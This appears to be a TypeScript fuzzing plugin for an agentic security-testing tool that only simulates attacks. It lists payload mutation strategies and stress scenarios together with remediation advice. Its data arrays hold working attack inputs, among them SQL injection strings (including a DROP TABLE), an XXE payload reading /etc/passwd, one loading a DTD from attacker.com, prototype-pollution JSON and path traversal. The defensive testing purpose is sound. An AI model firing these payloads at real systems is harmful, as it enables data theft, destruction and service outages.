import type {
  AgenticPlugin,
  PluginContext,
  PluginFinding,
  PluginResult,
  PluginTelemetry,
} from "../agentic/types";

interface PayloadMutationStrategy {
  readonly id: string;
  readonly name: string;
  readonly category: "boundary" | "injection" | "encoding" | "structure" | "semantic";
  readonly description: string;
  readonly exampleMutations: readonly string[];
  readonly targetSurface: string;
  readonly cvssBase: number;
  readonly cweId: string;
}

interface StressScenario {
  readonly id: string;
  readonly name: string;
  readonly description: string;
  readonly expectedFailureMode: string;
  readonly remediationControl: string;
  readonly severity: "high" | "medium" | "low" | "info";
}

interface FuzzingStateMachine {
  readonly states: readonly string[];
  readonly transitions: ReadonlyArray<{ from: string; to: string; trigger: string }>;
  readonly anomalousTransitions: ReadonlyArray<{ transition: string; risk: string }>;
}

const PAYLOAD_MUTATION_STRATEGIES: readonly PayloadMutationStrategy[] = [
  {
    id: "boundary-integer-overflow",
    name: "Integer Boundary Overflow",
    category: "boundary",
    description:
      "Probe numeric input boundaries with MAX_SAFE_INTEGER, INT32_MAX, INT64_MAX, -1, 0, and values ±1 around type boundaries " +
      "to trigger arithmetic overflow, wrap-around, or type coercion errors.",
    exampleMutations: [
      "2147483647",
      "2147483648",
      "-2147483648",
      "9007199254740991",
      "9007199254740992",
      "0",
      "-1",
    ],
    targetSurface: "numeric-parameters",
    cvssBase: 7.5,
    cweId: "CWE-190",
  },
  {
    id: "injection-sqli-payloads",
    name: "SQL Injection Mutation Set",
    category: "injection",
    description:
      "Classic and advanced SQL injection payload mutations including UNION-based, error-based, blind boolean, " +
      "time-based blind, and out-of-band extraction vectors.",
    exampleMutations: [
      "' OR '1'='1",
      "' OR 1=1--",
      "'; DROP TABLE users;--",
      "' UNION SELECT NULL,NULL,NULL--",
      "' AND SLEEP(5)--",
      "1; WAITFOR DELAY '0:0:5'--",
    ],
    targetSurface: "string-query-parameters",
    cvssBase: 9.8,
    cweId: "CWE-89",
  },
  {
    id: "injection-xxe",
    name: "XML External Entity (XXE) Payloads",
    category: "injection",
    description:
      "XXE payloads targeting XML parsers without external entity resolution disabled. Enables local file read, " +
      "SSRF, and in some parsers RCE via Java deserialization gadget chains.",
    exampleMutations: [
      '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
      '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % ext SYSTEM "http://attacker.com/evil.dtd"> %ext;]><root/>',
    ],
    targetSurface: "xml-input-endpoints",
    cvssBase: 8.6,
    cweId: "CWE-611",
  },
  {
    id: "encoding-unicode-bypass",
    name: "Unicode & Encoding Normalization Bypass",
    category: "encoding",
    description:
      "Input validation bypass using UTF-8 overlong encodings, Unicode homoglyphs, null bytes, and double-URL encoding " +
      "to circumvent input filters that do not normalize before validation.",
    exampleMutations: [
      "%2527",
      "%00",
      "\\u003cscript\\u003e",
      "%C0%AE%C0%AE/",
      "\xef\xbc\x9cscript\xef\xbc\x9e",
    ],
    targetSurface: "string-path-query-parameters",
    cvssBase: 6.8,
    cweId: "CWE-116",
  },
  {
    id: "structure-json-prototype-pollution",
    name: "JSON Prototype Pollution",
    category: "structure",
    description:
      "Object prototype pollution via `__proto__`, `constructor.prototype`, or `prototype` keys in JSON input " +
      "can modify shared prototype chains, leading to logic bypass, property injection, or RCE in server-side JS.",
    exampleMutations: [
      '{"__proto__":{"admin":true}}',
      '{"constructor":{"prototype":{"isAdmin":true}}}',
      '[{"__proto__":{"polluted":"yes"}}]',
    ],
    targetSurface: "json-request-bodies",
    cvssBase: 8.1,
    cweId: "CWE-1321",
  },
  {
    id: "semantic-business-logic",
    name: "Business Logic & State Tampering",
    category: "semantic",
    description:
      "Semantic fuzzing targeting business logic flaws: negative price values, quantity=0 purchases, coupon stacking, " +
      "IDOR via predictable resource IDs, race conditions in balance/credit updates.",
    exampleMutations: [
      '{"price":-1,"quantity":0}',
      '{"discount":{"code":"VALID","amount":99999}}',
      '{"userId":"../../admin"}',
    ],
    targetSurface: "business-api-endpoints",
    cvssBase: 7.2,
    cweId: "CWE-840",
  },
];

const STRESS_SCENARIOS: readonly StressScenario[] = [
  {
    id: "stress-slowloris",
    name: "Slowloris HTTP Exhaustion",
    description:
      "Slow HTTP attack: open many partial connections and send headers at minimal rate, " +
      "exhausting the server's connection table without triggering normal request timeouts.",
    expectedFailureMode: "Service unavailability, connection pool exhaustion, thread starvation",
    remediationControl:
      "Set aggressive read timeouts (header timeout ≤5s). Use an async server (Node.js/Nginx). Limit max connections per IP.",
    severity: "high",
  },
  {
    id: "stress-regexdos",
    name: "ReDoS — Regex Denial of Service",
    description:
      "Inputs crafted to trigger catastrophic backtracking in vulnerable regular expressions (exponential time complexity), " +
      "consuming 100% CPU on a single thread indefinitely.",
    expectedFailureMode: "Event loop starvation in Node.js, thread hang in sync regex engines",
    remediationControl:
      "Audit all regexes with a ReDoS static analyzer (safe-regex, vuln-regex-detector). Use linear-time engines (RE2) for user-supplied patterns.",
    severity: "high",
  },
  {
    id: "stress-memory-bomb",
    name: "Memory Allocation Bomb (Zip Bomb / JSON Depth)",
    description:
      "Deeply nested JSON (1000+ levels), large payload bodies, or zip bombs cause memory exhaustion " +
      "during parsing, triggering OOM kills or garbage collection storms.",
    expectedFailureMode: "OOM kill, heap exhaustion, 502/503 cascades",
    remediationControl:
      "Enforce strict body size limits (express `limit` option). Limit JSON nesting depth. Stream large file uploads rather than buffering.",
    severity: "medium",
  },
  {
    id: "stress-cache-poisoning",
    name: "Cache Poisoning via Header Injection",
    description:
      "Injecting cache-keyed headers (X-Forwarded-Host, X-Original-URL) to poison CDN or reverse-proxy caches, " +
      "serving malicious content to other users from the same cache key.",
    expectedFailureMode: "Persistent XSS via cached response, authorization bypass, data leakage between tenants",
    remediationControl:
      "Define explicit cache-key headers in CDN configuration. Strip unexpected forwarding headers at the edge. Apply cache-vary headers for user-specific content.",
    severity: "high",
  },
];

function buildFuzzStateMachine(intent: string): FuzzingStateMachine {
  const states = ["idle", "generating", "mutating", "transmitting", "observing", "reflecting", "terminating"];
  const transitions = [
    { from: "idle", to: "generating", trigger: "intent-received" },
    { from: "generating", to: "mutating", trigger: "base-payloads-ready" },
    { from: "mutating", to: "transmitting", trigger: "mutation-set-complete" },
    { from: "transmitting", to: "observing", trigger: "responses-received" },
    { from: "observing", to: "reflecting", trigger: "anomaly-detected-or-timeout" },
    { from: "reflecting", to: "mutating", trigger: "self-heal-retry-needed" },
    { from: "reflecting", to: "terminating", trigger: "goal-achieved-or-max-iter" },
  ];

  const anomalousTransitions = [
    {
      transition: "mutating → transmitting",
      risk: "Payload delivery gated — transmission blocked in simulation mode. All mutations remain advisory.",
    },
    {
      transition: "reflecting → mutating",
      risk: `Self-healing loop triggered by intent: "${intent.slice(0, 40)}…". ` +
        "Parameters mutated autonomously. Max retry depth: 3.",
    },
  ];

  return { states, transitions, anomalousTransitions };
}

export class MonstakFuzzingPlugin implements AgenticPlugin {
  readonly name = "MonstakFuzzingPlugin";

  async run(context: PluginContext): Promise<PluginResult> {
    const startedAt = Date.now();
    const { request } = context;

    const intentLower = request.intent.toLowerCase();
    const isApiTarget = /api|rest|graphql|http|endpoint/.test(intentLower);
    const isInputTarget = /input|form|upload|json|xml/.test(intentLower);

    const relevantStrategies = PAYLOAD_MUTATION_STRATEGIES.filter((s) => {
      if (isApiTarget && ["injection", "semantic", "structure"].includes(s.category)) return true;
      if (isInputTarget && ["boundary", "encoding", "injection"].includes(s.category)) return true;
      return true; // Always return full strategy set for comprehensive fuzzing plan
    });

    const stateMachine = buildFuzzStateMachine(request.intent);
    const highRiskStrategies = relevantStrategies.filter((s) => s.cvssBase >= 8.0);

    const findings: PluginFinding[] = [
      {
        id: "monstak-fuzzing-overview",
        severity: "info",
        title: `Stateful Fuzzing Pipeline — ${relevantStrategies.length} Mutation Strategies`,
        description:
          `MonstakFuzzing defined ${relevantStrategies.length} payload mutation strategies across ` +
          `${[...new Set(relevantStrategies.map((s) => s.category))].join(", ")} categories. ` +
          `${highRiskStrategies.length} high-risk strategies (CVSS ≥8.0) identified. ` +
          `State machine has ${stateMachine.states.length} states and self-healing retry loop configured.`,
        evidence: [
          `strategies:${relevantStrategies.length}`,
          `high-risk:${highRiskStrategies.length}`,
          `state-machine-states:${stateMachine.states.length}`,
          `scope:${request.authorizedScope.id}`,
        ],
        remediation:
          "Execute this fuzzing plan in an isolated staging environment with full request/response logging. Never run against production directly.",
      },
      ...relevantStrategies.map((s) => ({
        id: s.id,
        severity: s.cvssBase >= 9.0 ? ("high" as const) : s.cvssBase >= 7.0 ? ("medium" as const) : ("low" as const),
        title: `[${s.cweId}] ${s.name}`,
        description: `${s.description} Target surface: ${s.targetSurface}.`,
        evidence: [
          `category:${s.category}`,
          `cvss:${s.cvssBase}`,
          `cwe:${s.cweId}`,
          `example-count:${s.exampleMutations.length}`,
          ...s.exampleMutations.slice(0, 2).map((m, i) => `example-${i + 1}:${m.slice(0, 40).replaceAll("\n", "\\n")}`),
        ],
        remediation: `Apply input validation, output encoding, and parameterization to neutralize ${s.name} vectors.`,
      } satisfies PluginFinding)),
      ...STRESS_SCENARIOS.map((sc) => ({
        id: sc.id,
        severity: sc.severity as PluginFinding["severity"],
        title: `Stress Scenario: ${sc.name}`,
        description: `${sc.description} Expected failure mode: ${sc.expectedFailureMode}.`,
        evidence: [
          `scenario:${sc.name}`,
          `failure-mode:${sc.expectedFailureMode.slice(0, 60)}`,
          `mode:${request.mode}`,
        ],
        remediation: sc.remediationControl,
      } satisfies PluginFinding)),
      {
        id: "monstak-self-healing-loop",
        severity: "info",
        title: "Self-Healing Retry State Machine",
        description:
          `Fuzzing state machine configured with self-healing reflection loop: ` +
          stateMachine.anomalousTransitions.map((t) => `[${t.transition}] ${t.risk}`).join(" | "),
        evidence: [
          ...stateMachine.states.map((s) => `state:${s}`),
          ...stateMachine.anomalousTransitions.map((t) => `anomaly:${t.transition}`),
        ],
        remediation:
          "All self-healing transitions are simulation-only. Authorize retry depth limits before deploying autonomous fuzzing loops.",
      },
    ];

    const telemetry: PluginTelemetry = {
      plugin: this.name,
      durationMs: Math.max(0, Date.now() - startedAt),
      mode: request.mode,
      actionsConsidered: [
        "payload-mutation-generation",
        "state-machine-construction",
        "stress-scenario-planning",
        "self-healing-loop-configuration",
        "boundary-analysis",
        "injection-vector-enumeration",
      ],
      actionsBlocked: [
        "active-fuzzing-transmission",
        "exploit-delivery",
        "destructive-payload",
        "network-probing",
        "production-target-attack",
      ],
    };

    return {
      plugin: this.name,
      status: "simulated",
      findings,
      telemetry,
      blockedActions: telemetry.actionsBlocked,
      explanation:
        `MonstakFuzzing synthesized a ${relevantStrategies.length}-strategy payload mutation pipeline with a ` +
        `${stateMachine.states.length}-state machine and self-healing reflection loop. ` +
        `${STRESS_SCENARIOS.length} stress scenarios profiled. All payload generation is advisory — ` +
        "no mutations were transmitted to any target.",
    };
  }
}

export default MonstakFuzzingPlugin;
